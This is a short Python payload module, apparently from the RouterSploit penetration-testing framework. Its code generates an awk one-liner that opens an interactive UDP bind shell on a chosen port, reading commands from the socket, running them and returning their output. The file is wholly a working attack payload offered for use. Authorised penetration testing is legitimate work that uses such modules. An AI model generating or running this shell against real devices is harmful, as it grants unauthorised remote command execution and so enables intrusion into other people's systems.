from routersploit.core.exploit import *
from routersploit.core.exploit.payloads import BindTCPPayloadMixin, GenericPayload


class Exploit(BindTCPPayloadMixin, GenericPayload):
    __info__ = {
        "name": "Awk Bind UDP",
        "description": "Creates an interactive udp bind shell by using (g)awk.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
    }

    cmd = OptString("awk", "Awk binary")

    def generate(self):
        return (
            self.cmd +
            " 'BEGIN{s=\"/inet/udp/" +
            str(self.rport) +
            "/0/0\";for(;s|&getline c;close(c))" +
            "while(c|getline)print|&s;close(s)}'"
        )
